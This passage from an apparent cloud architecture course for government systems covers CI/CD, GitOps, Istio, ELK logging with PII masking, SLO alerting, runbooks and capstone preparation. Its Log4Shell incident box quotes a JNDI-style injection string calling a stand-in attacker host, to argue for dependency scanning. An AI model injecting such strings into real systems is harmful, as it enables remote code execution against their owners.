│  • API integration tests                                               │
│  • Smoke load test (5% of production load)                           │
│                                                                         │
│  STAGE 6: PRODUCTION DEPLOYMENT (after approval)                      │
│  ───────────────────────────────────────────────                       │
│  • Manual approval gate (senior engineer / release manager)           │
│  • Rolling deployment via Kubernetes (zero downtime)                  │
│  • Automated rollback if error rate > 1% in first 5 minutes          │
│  • Deployment recorded in ITSM tool (ServiceNow/Jira) for audit      │
└─────────────────────────────────────────────────────────────────────────┘
```

**Real Incident — Log4Shell in Government Systems (Dec 2021)**

> CVE-2021-44228, commonly known as Log4Shell, was one of the most severe vulnerabilities in software history (CVSS score 10.0 — maximum). It affected Apache Log4j, a logging library used in virtually every Java application.
>
> **What It Did:** An attacker could send a specially crafted string like `${jni:ldap://attacker.com/exploit}` in any logged field (username, search query, User-Agent header). Log4j would then make an outbound connection to the attacker's server and download malicious code for execution.
>
> **Impact on Government Systems:**
> - Multiple Indian state government portals that used Spring Boot (which bundles Log4j) were at risk
> - NIC issued an emergency advisory within 48 hours of disclosure
> - Teams without dependency scanning had to manually check hundreds of applications
> - Teams with automated SCA (Software Composition Analysis) in their CI/CD pipeline identified affected services within hours
>
> **Time to Identify:**
> - Without SCA in CI/CD pipeline: 3–7 days of manual audit per agency
> - With OWASP Dependency-Check in pipeline: The next build after NVD (National Vulnerability Database) updated flagged every affected service automatically
>
> **Resolution:** Update log4j-core to 2.17.1 in pom.xml, push to Git, CI/CD pipeline validates and deploys within 2 hours.
>
> **Lesson for Architects:** SCA is not optional. It is a safety mechanism. The question is not "can we afford SCA tooling?" It is "can we afford to not know what CVEs are running in our government system?"

---

### 3.4.3 GitOps — Infrastructure and Application Delivery

GitOps extends IaC to application deployment. Git becomes the single source of truth for both infrastructure and application configuration. The cluster continuously reconciles itself with the Git state.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    GITOPS DEPLOYMENT FLOW                               │
│                    (ArgoCD / Flux)                                     │
│                                                                         │
│  TRADITIONAL PUSH-BASED CI/CD:                                         │
│  CI Server ──────────────────────────────────────► Kubernetes          │
│  (Has cluster credentials, pushes kubectl commands)                    │
│  RISK: CI server compromise = full cluster access                      │
│                                                                         │
│  GITOPS PULL-BASED APPROACH:                                            │
│                                                                         │
│  ┌──────────────────────────────────────────────────────────┐          │
│  │  Git Repository (Source of Truth)                       │          │
│  │  /manifests/production/                                 │          │
│  │    grievance-service-deployment.yaml (image: v1.2.0)   │          │
│  │    grievance-service-service.yaml                       │          │
│  │    grievance-service-hpa.yaml                          │          │
│  └────────────────────────────┬─────────────────────────────┘          │
│                               │                                         │
│                     ArgoCD watches Git repo                            │
│                     Detects change (new image tag)                     │
│                               │                                         │
│                               ▼                                         │
│  ┌──────────────────────────────────────────────────────────┐          │
│  │  ArgoCD (running inside Kubernetes cluster)              │          │
│  │  Compares Git state vs Cluster state                    │          │
│  │  Detects drift → Applies changes to cluster             │          │
│  └──────────────────────────────────────────────────────────┘          │
│                               │                                         │
│                               ▼                                         │
│  ┌──────────────────────────────────────────────────────────┐          │
│  │  Kubernetes Cluster                                      │          │
│  │  Rolling deployment of new image                        │          │
│  └──────────────────────────────────────────────────────────┘          │
│                                                                         │
│  BENEFITS OF GITOPS:                                                    │
│  • Complete audit trail: Every deployment is a Git commit              │
│  • Rollback = git revert + automatic redeployment                      │
│  • CI server has NO cluster credentials (pull, not push)               │
│  • Cluster state always matches declared Git state                     │
│  • Drift detection: If someone manually changes K8s, ArgoCD reverts   │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Chapter 3.5 — Service Mesh: Istio & Linkerd

### 3.5.1 What Problem Does a Service Mesh Solve?

As microservices multiply, every service needs to:
- Encrypt traffic to every other service (mTLS)
- Handle retries and timeouts for network calls
- Report metrics and traces
- Apply traffic routing rules (A/B testing, canary deployments)

Without a service mesh, every development team implements these in their application code, using different libraries, in different languages, inconsistently.

A service mesh moves all of this out of the application into a dedicated infrastructure layer — a sidecar proxy running alongside every service pod.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    SERVICE MESH ARCHITECTURE                            │
│                                                                         │
│  WITHOUT SERVICE MESH:                                                  │
│  ─────────────────────                                                 │
│                                                                         │
│  GrievanceService ──► HTTP (unencrypted) ──► CitizenService           │
│  GrievanceService ──► No retry logic ──► PaymentService               │
│  GrievanceService ──► Manual metric code ──► each service             │
│                                                                         │
│  WITH SERVICE MESH (Istio):                                             │
│  ──────────────────────────                                            │
│                                                                         │
│  ┌──────────────────────────┐        ┌──────────────────────────┐     │
│  │  GrievanceService POD    │        │  CitizenService POD       │     │
│  │                          │        │                          │     │
│  │  ┌────────────────────┐  │        │  ┌────────────────────┐  │     │
│  │  │  Application Code  │  │        │  │  Application Code  │  │     │
│  │  │  (knows nothing   │  │        │  │  (knows nothing   │  │     │
│  │  │   about mTLS,     │  │        │  │   about mTLS,     │  │     │
│  │  │   retries, etc.)  │  │        │  │   retries, etc.)  │  │     │
│  │  └─────────┬──────────┘  │        │  └─────────▲──────────┘  │     │
│  │            │ localhost   │        │            │ localhost   │     │
│  │            ▼             │        │            │             │     │
│  │  ┌─────────────────────┐ │        │ ┌──────────┴────────────┐ │     │
│  │  │  Envoy Sidecar      │ │◄──────►│ │  Envoy Sidecar       │ │     │
│  │  │  Proxy (Istio)      │ │ mTLS   │ │  Proxy (Istio)       │ │     │
│  │  │                     │ │encrypted│ │                      │ │     │
│  │  │  • mTLS             │ │        │ │  • mTLS              │ │     │
│  │  │  • Retries          │ │        │ │  • Circuit breaking   │ │     │
│  │  │  • Metrics          │ │        │ │  • Metrics           │ │     │
│  │  │  • Tracing          │ │        │ │  • Tracing           │ │     │
│  │  └─────────────────────┘ │        │ └──────────────────────┘ │     │
│  └──────────────────────────┘        └──────────────────────────┘     │
│                                                                         │
│  Application code is unchanged. Security and resilience are           │
│  infrastructure concerns, not application concerns.                    │
│                                                                         │
│  CONTROL PLANE (Istio):                                                 │
│  Istiod manages all sidecar configurations.                            │
│  Issues mTLS certificates to each sidecar.                            │
│  Distributes traffic routing rules.                                    │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### 3.5.2 Traffic Management with Istio

**Canary Deployment — Safe Production Rollout**

```
┌─────────────────────────────────────────────────────────────────────────┐
│               CANARY DEPLOYMENT WITH ISTIO                              │
│                                                                         │
│  SCENARIO: Rolling out GrievanceService v1.3.0 with a new            │
│  AI-based grievance categorisation feature.                            │
│  Risk: New model may categorise incorrectly for some grievance types. │
│                                                                         │
│  PHASE 1: Start with 5% canary traffic                                │
│                                                                         │
│  All traffic ──► Istio VirtualService                                  │
│                        │                                               │
│              ┌─────────┴──────────┐                                   │
│              ▼ 95%                ▼ 5%                                 │
│      v1.2.0 pods            v1.3.0 pods (canary)                      │
│      (stable)               (new version)                             │
│                                                                         │
│  Istio VirtualService YAML:                                             │
│  ─────────────────────────                                             │
│  spec:                                                                  │
│    http:                                                               │
│    - route:                                                            │
│      - destination:                                                    │
│          host: grievance-service                                       │
│          subset: v1-2-0                                                │
│        weight: 95                                                      │
│      - destination:                                                    │
│          host: grievance-service                                       │
│          subset: v1-3-0                                                │
│        weight: 5                                                       │
│                                                                         │
│  PHASE 2: Monitor canary metrics for 30 minutes                       │
│  • Error rate: v1.3.0 shows 0.8% vs v1.2.0's 0.3% → investigate     │
│  • P95 latency: v1.3.0 shows 450ms vs v1.2.0's 280ms → AI model slow│
│                                                                         │
│  PHASE 3: Decision                                                      │
│  • Error rate acceptable? Rollforward to 50% → 100%                  │
│  • Error rate unacceptable? Rollback: set v1.3.0 weight to 0%        │
│    Rollback takes seconds. Zero downtime.                              │
│                                                                         │
│  This is why Istio traffic management matters:                        │
│  Production validation with real traffic, with instant rollback.     │
└─────────────────────────────────────────────────────────────────────────┘
```

**Fault Injection — Testing Resilience in Production-Like Environment**

Istio allows injecting faults (delays and errors) into traffic without changing application code. This is used to test whether circuit breakers, retries, and fallbacks are working correctly.

```yaml
# Inject 3-second delay for 10% of calls to CitizenService
# Tests: Does GrievanceService handle slow CitizenService gracefully?
apiVersion: networking.istio.io/v1alpha3
kind: VirtualService
metadata:
  name: citizen-service-fault-injection
spec:
  hosts:
  - citizen-service
  http:
  - fault:
      delay:
        percentage:
          value: 10.0     # 10% of requests
        fixedDelay: 3s    # Get a 3 second delay
    route:
    - destination:
        host: citizen-service
```

---

## Chapter 3.6 — Advanced Observability: ELK Stack

### 3.6.1 ELK Stack Architecture

ELK stands for Elasticsearch, Logstash, and Kibana. The modern variant is the Elastic Stack, which adds Beats (lightweight log shippers).

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    ELK STACK ARCHITECTURE                               │
│                    (Government Logging Platform)                        │
│                                                                         │
│  LOG SOURCES                                                            │
│  ────────────                                                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐                │
│  │ GrievanceSvc │  │  PaymentSvc  │  │  CitizenSvc  │                │
│  │  (App logs)  │  │  (App logs)  │  │  (App logs)  │                │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘                │
│         │                 │                  │                         │
│  ┌──────▼─────────────────▼──────────────────▼──────────────────┐    │
│  │                   FILEBEAT / FLUENTD                          │    │
│  │         (Lightweight log shipper — runs as DaemonSet)        │    │
│  │         Reads container logs from Kubernetes node filesystem  │    │
│  │         Adds metadata: pod name, namespace, node, labels      │    │
│  └──────────────────────────────┬────────────────────────────────┘    │
│                                 │                                       │
│                                 ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐     │
│  │                       LOGSTASH                               │     │
│  │               (Log transformation pipeline)                  │     │
│  │                                                              │     │
│  │  Input: Beats → Filter: Parse, enrich, mask PII → Output: ES│     │
│  │                                                              │     │
│  │  FILTER PIPELINE EXAMPLE:                                    │     │
│  │  1. Parse JSON log fields                                    │     │
│  │  2. Extract traceId and spanId from log                      │     │
│  │  3. Geo-enrichment: IP → State, District                    │     │
│  │  4. PII MASKING: Replace Aadhaar patterns with "REDACTED"   │     │
│  │     (Critical: Raw Aadhaar must never appear in log store)  │     │
│  │  5. Route: ERROR logs → high-priority index                  │     │
│  │            INFO logs → standard index                        │     │
│  └──────────────────────────────┬────────────────────────────────┘    │
│                                 │                                       │
│                                 ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐     │
│  │                    ELASTICSEARCH                              │     │
│  │              (Distributed log storage & search)              │     │
│  │                                                              │     │
│  │  Index Strategy (ILM — Index Lifecycle Management):          │     │
│  │  • Hot tier: Last 7 days (fast SSD, high replica count)     │     │
│  │  • Warm tier: 7–30 days (slower disk, fewer replicas)       │     │
│  │  • Cold tier: 30–365 days (object storage, read-only)       │     │
│  │  • Delete: After 365 days (or per data retention policy)    │     │
│  │                                                              │     │
│  │  Retention Policy (Government):                              │     │
│  │  Application logs: 90 days searchable, 1 year archived      │     │
│  │  Security/Audit logs: 2–7 years (depends on regulation)     │     │
│  └──────────────────────────────┬────────────────────────────────┘    │
│                                 │                                       │
│                                 ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐     │
│  │                       KIBANA                                 │     │
│  │            (Visualisation, search, dashboards)               │     │
│  │                                                              │     │
│  │  USE CASES:                                                  │     │
│  │  • Operations: Real-time error log search                    │     │
│  │  • Developers: Trace-based log correlation                   │     │
│  │  • Security: Alert on suspicious patterns                    │     │
│  │  • Management: Daily summary dashboards                      │     │
│  │  • Audit: Retrieve specific user activity for investigation  │     │
│  └──────────────────────────────────────────────────────────────┘     │
└─────────────────────────────────────────────────────────────────────────┘
```

**Logstash Pipeline — PII Masking for Government Compliance**

```ruby
# Logstash pipeline configuration
# File: /etc/logstash/conf.d/citizen-services.conf

input {
  beats {
    port => 5044
    ssl  => true
    ssl_certificate => "/etc/ssl/logstash.crt"
    ssl_key         => "/etc/ssl/logstash.key"
  }
}

filter {
  # Parse structured JSON logs from Spring Boot
  json {
    source => "message"
    target => "parsed"
  }
  
  # Extract standard fields
  mutate {
    add_field => {
      "service_name" => "%{[kubernetes][labels][app]}"
      "trace_id"     => "%{[parsed][traceId]}"
      "log_level"    => "%{[parsed][level]}"
    }
  }
  
  # CRITICAL: PII Masking before storage
  # Aadhaar numbers (12 digit) - mask all but last 4
  gsub {
    field   => "message"
    pattern => '\b[2-9]{1}[0-9]{11}\b'
    replacement => "AADHAAR-REDACTED"
  }
  
  # Mobile numbers - mask middle 6 digits
  gsub {
    field   => "message"
    pattern => '\b([6-9][0-9]{2})[0-9]{6}([0-9]{2})\b'
    replacement => '\1XXXXXX\2'
  }
  
  # Bank account numbers - mask all
  gsub {
    field   => "message"
    pattern => '\b[0-9]{9,18}\b'
    replacement => "ACCOUNT-REDACTED"
  }
  
  # Routing: errors go to high-priority index
  if [log_level] == "ERROR" {
    mutate { add_field => { "index_suffix" => "errors" } }
  } else {
    mutate { add_field => { "index_suffix" => "app" } }
  }
}

output {
  elasticsearch {
    hosts    => ["https://elasticsearch:9200"]
    index    => "citizen-services-%{index_suffix}-%{+YYYY.MM.dd}"
    user     => "${ES_USER}"
    password => "${ES_PASSWORD}"
    ssl      => true
    cacert   => "/etc/ssl/ca.crt"
  }
}
```

---

## Chapter 3.7 — Proactive Alerting, Runbooks & Incident Response

### 3.7.1 SLO-Based Alerting Strategy

Most teams alert on symptoms (CPU high, disk full). SLO-based alerting alerts on user impact (error rate high, latency high). This is fundamentally more useful.

```
┌─────────────────────────────────────────────────────────────────────────┐
│              SLO-BASED ALERTING: BURN RATE ALERTS                     │
│                                                                         │
│  CONCEPT: ERROR BUDGET BURN RATE                                        │
│                                                                         │
│  SLO: 99.9% availability monthly                                        │
│  Monthly error budget: 0.1% × 30 days × 24 hrs = 43.2 minutes        │
│                                                                         │
│  BURN RATE: How fast are we consuming the error budget?               │
│                                                                         │
│  Burn Rate = 1: Consuming budget at exactly the SLO rate              │
│              Budget runs out exactly at end of month                   │
│                                                                         │
│  Burn Rate = 10: Consuming budget 10× faster than planned             │
│              At this rate, monthly budget exhausted in 3 days         │
│                                                                         │
│  ALERT STRATEGY (Google SRE Model):                                    │
│  ─────────────────────────────────                                     │
│                                                                         │
│  ALERT 1: HIGH URGENCY — Page on-call immediately                      │
│  Condition: Burn rate > 14.4 over 1 hour                              │
│  Meaning: If sustained, monthly budget exhausted in 2 hours           │
│  Action: Wake someone up. Critical incident.                           │
│                                                                         │
│  ALERT 2: MEDIUM URGENCY — Slack notification                          │
│  Condition: Burn rate > 6 over 6 hours                                │
│  Meaning: Monthly budget exhausted in ~5 days at this rate            │
│  Action: Investigate during business hours, but soon.                 │
│                                                                         │
│  ALERT 3: LOW URGENCY — Ticket creation                               │
│  Condition: Burn rate > 3 over 1 day                                  │
│  Meaning: Monthly budget halved in ~10 days                           │
│  Action: Investigate and fix within the week.                         │
│                                                                         │
│  WHY THIS IS BETTER THAN THRESHOLD ALERTS:                             │
│  A 1-minute outage at 2 AM: Burn rate = high briefly, then normal.   │
│  Does NOT trigger a high urgency alert. Operations team sleeps.       │
│  A sustained 0.5% error rate across 2 hours: Burn rate stays high.  │
│  DOES trigger alert. Appropriate — this is actually burning budget.  │
└─────────────────────────────────────────────────────────────────────────┘
```

**Prometheus Alert Rules — Government Portal:**

```yaml
# Prometheus alerting rules for Citizen Services
# File: /etc/prometheus/rules/citizen-services-alerts.yml

groups:
- name: citizen-services-slo
  rules:
  
  # HIGH URGENCY: Fast burn rate
  - alert: GrievanceServiceHighErrorBurnRate
    expr: |
      (
        rate(http_requests_total{service="grievance-service",
             status=~"5.."}[1h])
        /
        rate(http_requests_total{service="grievance-service"}[1h])
      ) > 0.014  # 1.4% error rate = burn rate 14 for 99.9% SLO
    for: 2m
    labels:
      severity: critical
      team: citizen-services
    annotations:
      summary: "Grievance Service critical error burn rate"
      description: |
        Grievance Service is experiencing {{ $value | humanizePercentage }}
        error rate over the last 1 hour. At this rate, monthly error budget
        will be exhausted within 2 hours.
        Runbook: https://wiki.gov.in/runbooks/grievance-service-errors
        Dashboard: https://grafana.gov.in/d/grievance-service
  
  # LATENCY ALERT: P95 exceeds SLO
  - alert: GrievanceServiceHighLatency
    expr: |
      histogram_quantile(0.95,
        rate(http_request_duration_seconds_bucket{
          service="grievance-service"
        }[5m])
      ) > 3.0  # 3 second SLO for p95
    for: 5m
    labels:
      severity: warning
      team: citizen-services
    annotations:
      summary: "Grievance Service p95 latency exceeds 3s SLO"
      description: |
        P95 latency is {{ $value }}s, exceeding the 3s SLO.
        Check: database slow queries, downstream service latency.
        Runbook: https://wiki.gov.in/runbooks/grievance-service-latency
  
  # CERTIFICATE EXPIRY: Warn 30 days before
  - alert: TLSCertificateExpiryWarning
    expr: |
      (ssl_cert_not_after - time()) / 86400 < 30
    labels:
      severity: warning
    annotations:
      summary: "TLS certificate expiring in {{ $value | humanizeDuration }}"
      description: |
        Certificate for {{ $labels.domain }} expires in {{ $value }} days.
        Renew immediately to avoid service disruption.
```

---

### 3.7.2 Runbooks — Institutional Knowledge in Code

A runbook is a documented procedure for responding to a specific operational event. It is one of the most underrated engineering artifacts.

**Why Runbooks Matter in Government Systems**

Government projects have high staff turnover, long-term contracts with changing vendors, and complex handover processes. When an incident occurs at 2 AM, the on-call engineer should not have to figure out how to respond — the runbook should tell them exactly what to do.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    RUNBOOK: HIGH ERROR RATE                             │
│                    Grievance Service                                    │
│                    Version: 1.3 | Last Updated: 2025-11-10             │
├─────────────────────────────────────────────────────────────────────────┤
│  ALERT: GrievanceServiceHighErrorBurnRate                              │
│  SEVERITY: Critical | RESPONSE TIME: Within 15 minutes                │
├─────────────────────────────────────────────────────────────────────────┤
│  STEP 1: CONFIRM THE ALERT (2 minutes)                                 │
│  ──────────────────────────────────────                                │
│  1a. Open Grafana dashboard:                                           │
│      https://grafana.gov.in/d/grievance-service                       │
│  1b. Confirm error rate is genuinely high (not monitoring artefact)   │
│  1c. Check: Is this a new deployment? Check ArgoCD:                   │
│      https://argocd.gov.in/applications/grievance-service             │
│  1d. If new deployment in last 30 minutes: go to Step 5 (Rollback)   │
│                                                                         │
│  STEP 2: IDENTIFY ERROR TYPE (5 minutes)                               │
│  ─────────────────────────────────────                                 │
│  Run in Kibana:                                                         │
│  index: citizen-services-errors-*                                      │
│  query: service_name:"grievance-service" AND level:"ERROR"            │
│  time: last 15 minutes                                                 │
│                                                                         │
│  Common patterns and actions:                                          │
│  • "Connection refused" to PostgreSQL → Go to Step 3                 │
│  • "Timeout" calling CitizenService → Go to Step 4                   │
│  • NullPointerException (code bug) → Escalate to development team    │
│  • "Too many connections" → Go to Step 3b                            │
│                                                                         │
│  STEP 3: DATABASE ISSUES                                               │
│  ─────────────────────                                                 │
│  3a. Check RDS status in AWS console or:                              │
│      aws rds describe-db-instances --db-instance-identifier grievance │
│  3b. Connection pool exhausted: Restart connection pool without      │
│      full restart:                                                      │
│      kubectl rollout restart deployment/grievance-service             │
│  3c. RDS failover occurring: Wait 60-90 seconds for Multi-AZ         │
│      failover to complete. Alert resolves automatically.              │
│                                                                         │
│  STEP 4: DOWNSTREAM SERVICE ISSUES                                     │
│  ──────────────────────────────────                                   │
│  4a. Check CitizenService health:                                      │
│      kubectl get pods -n citizen-services -l app=citizen-service      │
│  4b. If citizen-service pods crashing: Escalate to citizen-service    │
│      on-call (Contact: See PagerDuty escalation policy)              │
│  4c. Circuit breaker should have opened. Verify in Grafana:          │
│      grievance_circuit_breaker_state{service="citizen-service"} == 1 │
│  4d. If circuit breaker not open: Check Resilience4j config          │
│                                                                         │
│  STEP 5: ROLLBACK PROCEDURE                                            │
│  ──────────────────────────                                            │
│  5a. Identify previous stable version in ArgoCD history              │
│  5b. In ArgoCD UI: Application → History → Select previous version   │
│      → Rollback                                                        │
│  OR via git:                                                            │
│      git revert <commit-sha>                                           │
│      git push origin main                                              │
│      (ArgoCD auto-deploys revert within 3 minutes)                   │
│                                                                         │
│  POST-INCIDENT                                                          │
│  ─────────────                                                          │
│  • File incident report within 24 hours                               │
│  • Timeline must include: detection time, response time, resolution   │
│  • Root cause analysis within 5 business days                         │
│  • Update this runbook if a new scenario was encountered              │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### 3.7.3 Incident Response — The RACI & Communication Model

**Government incident response has additional stakeholders beyond typical commercial systems:**

```
┌─────────────────────────────────────────────────────────────────────────┐
│         GOVERNMENT INCIDENT RESPONSE COMMUNICATION FLOW                │
│                                                                         │
│  SEVERITY 1 (Critical — Service Down for Citizens)                     │
│  ──────────────────────────────────────────────────                   │
│                                                                         │
│  T+0: Alert fires. On-call engineer paged.                            │
│                                                                         │
│  T+15 min: If not resolved, escalate to:                              │
│  • Engineering Team Lead                                               │
│  • Operations Manager                                                  │
│  • Update status page: https://status.gov.in (Citizens see this)      │
│                                                                         │
│  T+30 min: If not resolved, escalate to:                              │
│  • Project Manager                                                      │
│  • Ministry IT Head notification (if > 30 min citizen impact)         │
│  • CERT-In notification if security-related incident                  │
│    (India: cert-in.org.in — mandatory within 6 hours of breach)      │
│    (Singapore: CSA — mandatory within 1 hour for critical systems)   │
│                                                                         │
│  T+1 hour: War room call opened                                        │
│  • All relevant engineers join                                          │
│  • Designated Incident Commander (single decision-maker)              │
│  • Designated Comms Lead (updates status page, responds to queries)   │
│  • Designated Scribe (documents timeline in real-time)                │
│                                                                         │
│  DURING INCIDENT: ONE STATUS UPDATE EVERY 15 MINUTES                  │
│  Even if update is "We are still investigating."                      │
│  Silence is worse than "no update yet."                               │
│                                                                         │
│  STATUS PAGE UPDATE TEMPLATE:                                          │
│  "We are currently investigating an issue affecting the Grievance     │
│  Submission service. Citizens may experience errors when submitting   │
│  new grievances. Viewing existing grievances is not affected.         │
│  Our team is working to resolve this. Next update: 14:30 IST."       │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Chapter 3.8 — Capstone Defense Preparation Guide

### 3.8.1 What the Capstone Evaluation Looks For

The expert panel evaluates your solution across four dimensions. Understanding these in advance helps you design your system — and your presentation — appropriately.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    CAPSTONE EVALUATION RUBRIC                          │
│                                                                         │
│  DIMENSION 1: SCALABILITY (25 points)                                  │
│  ─────────────────────────────────────                                 │
│  What evaluators look for:                                             │
│  • Can the system handle 10× stated peak load?                        │
│  • Where are the scaling bottlenecks? Were they addressed?            │
│  • Is scaling horizontal (preferred) or only vertical?               │
│  • Are databases a scaling bottleneck? How was this mitigated?        │
│  • Does the HPA configuration match the actual traffic pattern?      │
│  • Is there pre-scaling logic for known peak events?                 │
│                                                                         │
│  Questions to prepare for:                                             │
│  "Your system needs to handle the last-day income tax rush.          │
│   Walk me through what happens to each component under 50×           │
│   normal load. Where does it break?"                                  │
│                                                                         │
│  ─────────────────────────────────────────────────────────────        │
│                                                                         │
│  DIMENSION 2: SECURITY (25 points)                                     │
│  ─────────────────────────────────                                     │
│  What evaluators look for:                                             │
│  • Zero trust implementation: Is it real or just mTLS only?          │
│  • OWASP Top 10: How are these addressed in your design?             │
│  • PII handling: Where is citizen data stored? Who can access it?    │
│  • Secret management: No hardcoded credentials anywhere?             │
│  • Audit trail: Can every data access be traced to a specific user?  │
│  • Supply chain: How is third-party code validated?                   │
│                                                                         │
│  Questions to prepare for:                                             │
│  "Show me how a malicious insider in Ministry A could attempt        │
│   to access citizen health data from Ministry B's service.          │
│   What prevents this at each layer?"                                 │
│                                                                         │
│  ─────────────────────────────────────────────────────────────        │
│                                                                         │
│  DIMENSION 3: COST OPTIMISATION (25 points)                            │
│  ─────────────────────────────────────────                             │
│  What evaluators look for:                                             │
│  • Is TCO analysis present for major technology choices?             │
│  • Are there over-provisioned resources without justification?       │
│  • Right-sizing: Are instance types appropriate for workload?        │
│  • Cost vs availability trade-off: Is Multi-AZ justified?           │
│  • Data transfer costs considered in architecture?                   │
│  • Reserved vs on-demand: Was commitment-based pricing considered?   │
│                                                                         │
│  Questions to prepare for:                                             │
│  "Your architecture uses 40 Kubernetes worker nodes in production.   │
│   Justify this number. What is the monthly infrastructure cost?      │
│   How would you reduce cost by 30% without compromising SLOs?"      │
│                                                                         │
│  ─────────────────────────────────────────────────────────────        │
│                                                                         │
│  DIMENSION 4: AI INTEGRATION (25 points)                               │
│  ───────────────────────────────────────                               │
│  What evaluators look for:                                             │
│  • Is AI use meaningful (not just cosmetic)?                          │
│  • Was AI-generated code properly reviewed and validated?            │
│  • Are there security guardrails on AI-generated components?         │
│  • Can you explain every line of AI-generated code?                  │
│  • Is the AI feature observable (metrics, logging, alerting)?        │
│  • What happens when the AI component fails?                          │
│                                                                         │
│  Questions to prepare for:                                             │
│  "Your grievance categorisation uses an AI model. What happens      │
│   when the model confidence is below 60%? Is there a fallback?     │
│   How do you detect model drift over 6 months in production?"       │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### 3.8.2 Architecture Presentation Structure

```
┌─────────────────────────────────────────────────────────────────────────┐
│          CAPSTONE DEFENSE PRESENTATION STRUCTURE (30 minutes)          │
│                                                                         │
│  SECTION 1: PROBLEM STATEMENT (3 minutes)                              │
│  ────────────────────────────────────────                              │
│  • What government problem are you solving?                            │
│  • Who are the users? How many? What geography?                       │
│  • What are the top 3 NFRs that drove your design?                   │
│  • What were the regulatory constraints?                               │
│                                                                         │
│  SECTION 2: ARCHITECTURE OVERVIEW (8 minutes)                          │
│  ─────────────────────────────────────────────                         │
│  • Context diagram: System in its environment                          │
│  • Container diagram: All services and their interactions             │
│  • Data flow: How data moves through the system                       │
│  • Infrastructure: Deployment topology, availability zones            │
│  Walk through a typical user journey end-to-end.                      │
│                                                                         │
│  SECTION 3: KEY DECISIONS (ADRs) (5 minutes)                          │
│  ─────────────────────────────────────────                             │
│  Pick your 3 most significant architectural decisions.                 │
│  For each:                                                              │
│  • What was the context/constraint?                                    │
│  • What alternatives did you consider?                                 │
│  • What did you choose and why?                                        │
│  • What do you give up with this choice?                              │
│                                                                         │
│  SECTION 4: SCALABILITY WALKTHROUGH (5 minutes)                        │
│  ──────────────────────────────────────────────                        │
│  • Load test results: Show numbers, not just claims                   │
│  • Where is your current bottleneck at 10× load?                     │
│  • How does HPA respond during a traffic spike?                       │
│  • What happens to your system during a database failover?           │
│                                                                         │
│  SECTION 5: SECURITY WALKTHROUGH (4 minutes)                          │
│  ───────────────────────────────────────────                           │
│  • Walk through the CI/CD security gates                              │
│  • Show the zero trust layers for one user request                    │
│  • How is PII protected at rest, in transit, in logs?                │
│                                                                         │
│  SECTION 6: Q&A (5 minutes)                                            │
│  ──────────────────────────                                            │
│  Panel will probe weaknesses. Be honest if something is not          │
│  implemented. "We identified this as a gap and here is our plan      │
│  to address it" is far better than bluffing.                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### 3.8.3 Common Capstone Failure Modes — Learn From Previous Cohorts

```
┌─────────────────────────────────────────────────────────────────────────┐
│          COMMON CAPSTONE WEAKNESSES AND HOW TO AVOID THEM              │
│                                                                         │
│  WEAKNESS 1: Architecture exists only in diagrams                      │
│  ─────────────────────────────────────────────────                    │
│  Symptom: Beautiful C4 diagrams. No working code. No load test.       │
│  Fix: Ensure at least core services run and are demonstrable.         │
│       Even a simplified version running > a complete PowerPoint.      │
│                                                                         │
│  WEAKNESS 2: Security is an afterthought layer                         │
│  ──────────────────────────────────────────────                       │
│  Symptom: "We'll add security later." or security is only the WAF.   │
│  Fix: Security must be traceable through every layer. Show the        │
│       zero-trust flow. Show the CI/CD security gates in the pipeline. │
│                                                                         │
│  WEAKNESS 3: No real NFR numbers                                        │
│  ───────────────────────────────                                       │
│  Symptom: "The system will be fast and scalable."                     │
│  Fix: Quantify everything.                                              │
│       "P95 response time under 2s for 50,000 concurrent users."      │
│       "99.9% availability = 43 minutes downtime allowed per month."   │
│       "Database must handle 50,000 write transactions per minute."    │
│                                                                         │
│  WEAKNESS 4: AI is a checkbox, not a feature                          │
│  ─────────────────────────────────────────                            │
│  Symptom: "We used GitHub Copilot to generate the CRUD code."        │
│  Fix: AI must solve a real domain problem. Automatic grievance        │
│       categorisation, intelligent routing, fraud detection on         │
│       citizen transactions are meaningful AI integrations.           │
│       Show the validation: What tests run on the AI output?          │
│                                                                         │
│  WEAKNESS 5: Cost is not considered                                     │
│  ─────────────────────────────────                                     │
│  Symptom: Architecture uses 200 nodes but no cost analysis.          │
│  Fix: Every major technology choice should have a rough TCO note.    │
│       "We chose managed RDS over StatefulSet because ops cost        │
│        savings over 3 years exceed the service premium by 40%."     │
│                                                                         │
│  WEAKNESS 6: No discussion of failure modes                            │
│  ──────────────────────────────────────────                            │
│  Symptom: Architecture only shows the happy path.                     │
│  Fix: For every key component, answer: "What happens if this fails?"  │
│       Show circuit breakers, SAGAs with compensation, DLQs,          │
│       fallbacks, and graceful degradation strategies.                 │
└─────────────────────────────────────────────────────────────────────────┘
```

---

# Part 3 — Terms to Google: Research Guide

## Containerization & Kubernetes

| Topic                  | Search Term                                                | Why                  |
| ---------------------- | ---------------------------------------------------------- | -------------------- |
| Docker multi-stage     | `"Docker multi-stage build Java production example"`       | Day 12 hands-on      |
| Kubernetes Deployment  | `"Kubernetes Deployment rolling update strategy tutorial"` | Core K8s concept     |
| HPA custom metrics     | `"Kubernetes HPA custom metrics Prometheus adapter"`       | Advanced autoscaling |
| Kubernetes StatefulSet | `"Kubernetes StatefulSet vs Deployment when to use"`       | Stateful services    |
| Pod security           | `"Kubernetes pod security context runAsNonRoot example"`   | Security hardening   |
| Trivy scanning         | `"Trivy container image vulnerability scanning CI"`        | Container security   |

## Infrastructure as Code

| Topic             | Search Term                                            | Why                |
| ----------------- | ------------------------------------------------------ | ------------------ |
| Terraform basics  | `"Terraform tutorial AWS beginners getting started"`   | Day 12 IaC         |
| Terraform state   | `"Terraform remote state S3 backend locking DynamoDB"` | Team collaboration |
| Terraform modules | `"Terraform modules reusable best practices"`          | Code reuse         |
